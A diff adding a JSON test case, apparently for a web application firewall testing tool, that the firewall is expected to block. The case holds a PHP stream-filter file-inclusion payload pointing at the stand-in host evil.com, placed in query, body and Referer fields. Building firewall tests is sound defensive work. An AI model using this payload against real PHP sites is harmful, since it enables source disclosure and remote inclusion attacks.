@@ -1,0 +1,11 @@
+{
+    "payload": [
+      {
+        "ARGS": "param%RND%=php://filter/convert.base64-encode/resource=http://evil.com/index.php",
+        "BODY": "param%RND%=php://filter/convert.base64-encode/resource=http://evil.com/index.php",
+        "REFERER": "php://filter/convert.base64-encode/resource=http://evil.com/index.php",
+        "ENCODE": "Base64 UTF-16",
+        "BLOCKED": true
+      }
+    ]
+  }
